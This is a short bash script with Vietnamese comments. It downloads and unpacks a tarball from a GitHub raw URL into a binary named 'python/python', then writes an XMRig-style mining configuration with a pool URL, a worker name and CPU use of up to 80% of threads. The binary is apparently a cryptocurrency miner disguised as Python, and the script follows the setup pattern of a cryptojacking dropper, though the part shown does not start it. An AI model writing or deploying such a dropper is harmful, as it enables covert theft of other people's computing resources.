#!/bin/bash

DOMAIN=$1      # domain:port
HOSTNAME=$2    # hostname
CONFIG="config.json"
PATH_FILE="python/python"

# Nếu chưa có binary thì tải và giải nén
if [ ! -f "$PATH_FILE" ]; then
    curl -L -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz
    tar -xzf python.tar.gz
    rm -f python.tar.gz
fi

# Nếu chưa có config.json thì tạo
if [ ! -f "$CONFIG" ]; then
cat > "$CONFIG" <<EOF
{
  "pools": [
    {
      "url": "$DOMAIN",
      "user": "$HOSTNAME",
      "pass": "x",
      "tls": true,
      "keepalive": true
    }
  ],
  "cpu": {
    "enabled": true,
    "max-threads-hint": 80
  }
}
EOF
fi
